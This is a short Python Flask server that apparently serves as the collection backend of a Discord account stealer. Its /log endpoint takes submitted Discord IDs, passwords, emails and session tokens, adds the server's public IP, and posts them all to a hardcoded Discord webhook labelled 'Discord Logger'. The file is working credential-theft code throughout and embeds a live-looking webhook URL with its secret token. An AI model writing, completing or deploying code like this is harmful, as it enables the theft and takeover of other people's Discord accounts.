from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1541433918895431680/nn6xsk7Ks_lCRdO5fmTKfKO9r2s9hNgJeRZcbh56sC02PtsR9bfpN-BewmHieRVSU9il'

# Function to get the public IP address
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json()['ip']
    except Exception as e:
        return 'Unknown'

# Function to log data to Discord
def log_to_discord(data):
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            return True
        else:
            return False
    except Exception as e:
        return False

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    discord_id = data.get('discord_id')
    discord_password = data.get('discord_password')
    discord_email = data.get('discord_email')
    discord_token = data.get('discord_token')

    ip_address = get_public_ip()

    message = {
        'content': f'Discord ID: {discord_id}\nPassword: {discord_password}\nEmail: {discord_email}\nIP: {ip_address}\nToken: {discord_token}',
        'username': 'Discord Logger',
        'avatar_url': 'https://i.pinimg.com/736x/7a/ec/a0/7aeca0260f0fa319d85cd9d10e1cfbd9.jpg'
    }

    if log_to_discord(message):
        return jsonify({'success': True}), 200
    else:
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
